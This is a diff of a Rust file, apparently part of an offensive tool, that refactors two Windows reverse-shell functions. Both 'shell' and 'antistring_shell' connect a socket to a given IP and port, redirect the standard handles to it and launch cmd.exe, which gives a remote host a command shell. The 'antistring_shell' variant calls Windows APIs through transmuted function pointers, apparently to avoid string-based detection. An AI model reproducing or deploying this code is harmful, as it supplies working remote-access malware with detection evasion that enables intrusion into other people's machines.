@@ -60,11 +60,10 @@ pub fn shell(ip: &str, port: u16) {
     // This is magic that I don't really understand but seems to work
     let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
     // Create a PCSTR and use the IP string as the 0 field
-    let ip_pcstr = PCSTR {
-        0: CString::new(ip)
-            .unwrap()
-            .into_raw() as *mut u8
-    };
+    let ip_pcstr = PCSTR(CString::new(ip)
+        .unwrap()
+        .into_raw() as *mut u8
+    );
     // Calling pton with the pointer sin_addr_ptr --> sockaddr_in.sin_addr should mean sockaddr_in.sin_addr has the IP struct now
     let conversion_result = unsafe {
         inet_pton(
@@ -124,11 +123,10 @@ pub fn shell(ip: &str, port: u16) {
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
-    let lp_command_line = PSTR {
-        0: CString::new(format!("{system_dir}\\cmd.exe"))
-            .unwrap()
-            .into_raw() as *mut u8
-    };
+    let lp_command_line = PSTR(CString::new(format!("{system_dir}\\cmd.exe"))
+        .unwrap()
+        .into_raw() as *mut u8
+    );
     let create_res = unsafe {
         CreateProcessA(
             PCSTR::null(),
@@ -170,11 +168,10 @@ pub fn antistring_shell(ip: &str, port: u16) {
     let mut sockaddr_in = SOCKADDR_IN::default();
     sockaddr_in.sin_family = AF_INET.0 as u16;
     let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
-    let ip_pcstr = PCSTR {
-        0: CString::new(ip)
-            .unwrap()
-            .into_raw() as *mut u8
-    };
+    let ip_pcstr = PCSTR(CString::new(ip)
+        .unwrap()
+        .into_raw() as *mut u8
+    );
     unsafe { 
         mem::transmute::<*const (), fn(i32, PCSTR, *mut c_void) -> i32>
         (function)(AF_INET.0 as i32, ip_pcstr, sin_addr_ptr)
@@ -213,28 +210,21 @@ pub fn antistring_shell(ip: &str, port: u16) {
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
-    let lp_application_name = PCSTR::null();
-    let lp_command_line = PSTR {
-        0: CString::new(format!("{system_dir}\\cmd.exe"))
-            .unwrap()
-            .into_raw() as *mut u8
-    };
-    let lp_process_attributes = SECURITY_ATTRIBUTES::default();
-    let lp_thread_attributes = SECURITY_ATTRIBUTES::default();
-    let dw_creation_flags = PROCESS_CREATION_FLAGS::default();
-    let lp_current_directory = PCSTR::null();
-    let mut process_information = PROCESS_INFORMATION::default();
+    let lp_command_line = PSTR(CString::new(format!("{system_dir}\\cmd.exe"))
+        .unwrap()
+        .into_raw() as *mut u8
+    );
     unsafe {
         mem::transmute::<*const (), fn(PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION) -> BOOL>
-        (function)(lp_application_name,
+        (function)(PCSTR::null(),
                    lp_command_line,
-                   &lp_process_attributes,
-                   &lp_thread_attributes,
+                   &SECURITY_ATTRIBUTES::default(),
+                   &SECURITY_ATTRIBUTES::default(),
                    true,
-                   dw_creation_flags,
+                   PROCESS_CREATION_FLAGS::default(),
                    ptr::null(),
-                   lp_current_directory,
+                   PCSTR::null(),
                    &startup_info,
-                   &mut process_information)
+                   &mut PROCESS_INFORMATION::default())
     };
 }
